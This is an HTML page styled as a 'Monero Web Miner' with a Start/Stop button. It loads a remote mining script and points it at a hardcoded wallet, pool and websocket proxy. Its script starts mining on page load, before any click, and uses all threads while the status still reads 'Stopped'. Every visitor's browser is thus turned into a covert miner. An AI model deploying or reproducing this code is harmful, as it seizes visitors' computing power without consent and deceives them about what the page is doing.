<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monero Web Miner</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            text-align: center;
            background-color: #f4f4f4;
        }
        #miner-status {
            margin-top: 20px;
            padding: 20px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            display: inline-block;
        }
        #miner-status p {
            margin: 10px 0;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <h1>Monero Web Miner</h1>
    <button onclick="toggleMining()">Start/Stop Mining</button>
    <div id="miner-status">
        <p>Status: <span id="status">Stopped</span></p>
        <p>Hashrate: <span id="hashrate">0 H/s</span></p>
        <p>Total Hashes: <span id="total-hashes">0</span></p>
        <p>Accepted Shares: <span id="accepted-shares">0</span></p>
    </div>

    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
    <script>
        // Configuration
        const server = "wss://ny1.xmrminingproxy.com";
        const pool = "moneroocean.stream";
        const walletAddress = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
        const workerId = "Web-Miner";
        const threads = -1; // Use all available threads
        const password = "";
        let isMining = false;

        // Metrics
        let totalHashes = 0;
        let acceptedShares = 0;
        let hashrate = 0;

        // Start mining
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 20; // Throttle to 20% to avoid overloading the browser

        // Update metrics
        function updateMetrics() {
            if (typeof getHashesPerSecond === "function") {
                hashrate = getHashesPerSecond();
                document.getElementById("hashrate").innerText = hashrate.toFixed(2) + " H/s";
            }
            if (typeof getTotalHashes === "function") {
                totalHashes = getTotalHashes();
                document.getElementById("total-hashes").innerText = totalHashes;
            }
            if (typeof getAcceptedHashes === "function") {
                acceptedShares = getAcceptedHashes();
                document.getElementById("accepted-shares").innerText = acceptedShares;
            }
            document.getElementById("status").innerText = isMining ? "Running" : "Stopped";
        }

        // Toggle mining
        function toggleMining() {
            if (isMining) {
                stopMining();
                isMining = false;
                document.getElementById("status").innerText = "Stopped";
            } else {
                startMining(pool, walletAddress, workerId, threads, password);
                isMining = true;
                document.getElementById("status").innerText = "Running";
            }
        }

        // Update metrics every second
        setInterval(updateMetrics, 1000);
    </script>
</body>
</html>
